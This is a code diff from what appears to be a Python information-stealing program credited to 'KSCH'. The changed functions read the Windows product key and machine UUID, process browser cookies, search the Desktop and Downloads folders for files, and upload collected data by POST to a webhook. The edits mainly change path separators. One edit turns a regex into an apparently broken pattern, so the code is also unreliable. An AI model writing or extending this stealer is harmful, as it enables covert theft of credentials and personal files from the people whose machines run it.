@@ -184,8 +184,8 @@ class Functions(object):
     def sys_1fo() -> list:
         flag = 0x08000000
         sh1 = "wmic csproduct get uuid"
-        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
-        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
+        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE/Microsoft/Windows NT/CurrentVersion/SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
+        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE/Microsoft/Windows NT/CurrentVersion' -Name ProductName"
         try:
             uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
         except Exception:
@@ -1356,7 +1356,7 @@ def Trust(Cookies):
 
 
 def Reformat(listt):
-    e = re.findall("(\w+[a-z])",listt)
+    e = re.findall(r"(/w+a[a-z])", listt)
     while "https" in e: e.remove("https")
     while "com" in e: e.remove("com")
     while "net" in e: e.remove("net")
@@ -1468,7 +1468,7 @@ def upload(name, tk=''):
     LoadRequests("POST", hook, files=files)
 
 def writeforfile(data, name):
-    path = os.getenv("TEMP") + f"\{name}.txt"
+    path = os.getenv("TEMP") + f"{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
         f.write(f"Created by KSCH | https://github.com/KSCHdsc\n\n")
         for line in data:
@@ -1711,7 +1711,7 @@ def bc_create_file(path, keywords):
     bc_create_files.append(["folder", path, fifound])
 
 def bc_checking():
-    user = temp.split("\AppData")[0]
+    user = temp.split("/AppData")[0]
     path2search = [
         user + "/Desktop",
         user + "/Downloads",
